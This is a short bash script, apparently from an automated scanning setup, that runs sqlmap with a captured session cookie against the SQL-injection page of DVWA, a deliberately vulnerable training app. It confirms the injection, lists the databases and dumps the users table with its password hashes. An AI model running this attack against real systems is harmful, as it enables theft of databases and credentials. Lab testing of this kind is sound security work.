#!/usr/bin/env bash
# Authenticated sqlmap run against DVWA's SQL-injection page.
# Reads the cookie captured by _bootstrap.sh, confirms the injection,
# enumerates the DBs, and dumps the dvwa.users table (password hashes).
set -uo pipefail
COOKIE=$(cat /opt/argus-ai/gemini-scans/dvwa/.dvwa-sqlmap-cookie)
URL="http://target-w/vulnerabilities/sqli/?id=1&Submit=Submit"

sqlmap -u "$URL" --cookie="$COOKIE" -p id \
  --batch --technique=BEU --flush-session \
  --banner --current-user --current-db --dbs \
  -D dvwa -T users --dump \
  2>&1 | tee /opt/argus-ai/gemini-scans/dvwa/03-sqlmap.txt
